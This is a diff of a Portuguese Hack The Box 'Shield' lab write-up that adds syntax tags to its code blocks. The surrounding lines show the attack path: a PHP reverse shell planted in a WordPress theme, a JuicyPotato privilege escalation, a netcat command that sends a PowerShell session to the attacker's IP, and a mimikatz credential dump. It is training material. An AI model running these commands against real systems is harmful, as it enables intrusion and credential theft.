@@ -25,7 +25,7 @@ alt: "HTB Shield Writeup"
 ## RECON
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Shield]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.29 --min-rate=512
 PORT     STATE SERVICE VERSION
@@ -55,7 +55,7 @@ Desta vez sabemos que há grandes chances de estarmos lidando com o Windows Serv
 
 Nos deparamos com a página padrão do IIS HTTPD, o que nos dá uma boa informação. Mas precisamos de algo mais, vamos fazer uma varredura de diretórios com `gobuster`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Shield]
 └─$ gobuster dir -e -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt -r
 ===============================================================
@@ -104,7 +104,7 @@ Se selecionarmos o tema `GutenBooster`, podemos editar o código fonte da págin
 
 Ao editar a página, podemos inserir um payload de conexão reversa, no meu caso utilizarei o seguinte:
 
-```
+```php
 <?php
 // Copyright (c) 2020 Ivan Šincek
 // v2.4
@@ -292,7 +292,7 @@ Ao clicar em `Update File`, nós salvamos a alteração. Precisamos setar um `ne
 
 Por padrão, o Wordpress salva seus recursos de tema em `wp-content/<nome do tema>/404.php`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Shield]
 └─$ curl 10.10.10.29/wordpress/wp-content/themes/gutenbooster/404.php
 ```
@@ -307,7 +307,7 @@ Esta máquina também não possui a flag de usuário, portanto, precisamos efetu
 
 Ao efetuar a enumeração local, descobrimos que estamos logados com o usuário `iis apppool\wordpress` e o sistema tem a arquitetura `x64`.
 
-```
+```cmd
 C:\inetpub\wwwroot\wordpress\wp-content\themes\gutenbooster>whoami
 iis apppool\wordpress
 
@@ -367,7 +367,7 @@ Esta vunerabilidade permite a escalção de privilégios. Mais informações sob
 
 Após baixar o binário do repositório citado acima, precisamos fazer upload para o servidor, para isso vamos iniciar um server HTTP com python3 e utilizar o comando `certutil do windows`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Shield]
 └─$ mv JuicyPotato.exe jp.exe
                                                                                                                      
@@ -398,14 +398,14 @@ No diretório `/usr/share/windows-binaries/` encontramos o `nc.exe`, que podemos
 
 Com o netcat na máquina alvo, podemos usar o próprio `echo` do Windows para criarmos um script `reverse.bat` com o comando para nos enviar um Power Shell com o netcat.
 
-```
-    C:\inetpub\wwwroot\wordpress\wp-content\uploads>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.15.185 8444 > reverse.bat  
+```cmd
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.15.185 8444 > reverse.bat  
 ```
 <img src="/htb/htb-shield-11.png">
 
 Com tuddo pronto, podemos setar um netcat para ouvir na porta 8444, que foi a utilizada em nosso script e enviar o comando para o exploit.
 
-```
+```cmd
 C:\inetpub\wwwroot\wordpress\wp-content\uploads>jp.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\reverse.bat -l 1337
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 ......
@@ -435,7 +435,7 @@ Agora em nosso shell administrativo, podemos executá-lo.
 
 Com o comando `sekurlsa::logonpasswords`, obtemos o dump de todos as senhas em cache.
 
-```
+```cmd
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -652,7 +652,7 @@ mimikatz #
 ```
 E entre os dados do dump, conseguimos as seguintes credenciais:
 
-```
+```cmd
         kerberos :
          * Username : sandra
          * Domain   : MEGACORP.LOCAL
